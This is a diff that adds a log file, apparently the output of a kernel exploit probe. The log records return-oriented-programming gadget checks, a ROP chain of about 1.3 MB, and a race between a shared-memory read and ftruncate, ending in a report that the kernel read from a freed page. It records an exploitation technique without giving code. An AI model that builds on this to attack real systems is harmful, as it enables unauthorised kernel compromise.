@@ -1,0 +1,37 @@
+=== PROBE 1530a: shm read vs ftruncate ===
+
+fn_addr=0x0000000835D5CB57 pid=143
+
+[A] gadget verification
+eboot=0x000000001FE68000
+  pop_rax=OK pop_rdi=OK pop_rsi=OK pop_rdx=OK ret=OK pop_rsp=OK
+
+[B] shm object
+  shm_open(SHM_ANON=1) -> 25
+  ftruncate(25, 0x10000) rv=0
+  shm mmap -> 0x0000000310C18000
+  destination mmap -> 0x0000000310DFC000
+  shm filled with 0x41, destination zeroed
+
+[C] child chain
+  stack mmap -> 0x00000003115A4000 need=1364536 alloc=1376256
+  chain qwords=168007 bytes=1344056 alloc=1376256 stack=0x00000003115A4000
+
+[D] race
+  thr_new rv=0 child_tid=102269
+  positive control: destination turned 0x41 = true
+  round 500 sampled=500 foreign_bytes=20475
+  round 1000 sampled=1000 foreign_bytes=52975
+  round 1500 sampled=1500 foreign_bytes=85475
+  round 2000 sampled=2000 foreign_bytes=117975
+  round 2500 sampled=2500 foreign_bytes=150475
+  round 3000 sampled=3000 foreign_bytes=182975
+  rounds=3000 samples=3000 stale=2815 foreign_bytes=182975
+  first foreign: round 186 byte 1: 42 42 42 42 42
+
+[E] verdict
+  *** FOREIGN BYTES IN THE READ DESTINATION ***
+  the kernel copied out of a page it had already released
+  final pid=143 expected 143
+
+=== PROBE 1530a COMPLETE ===
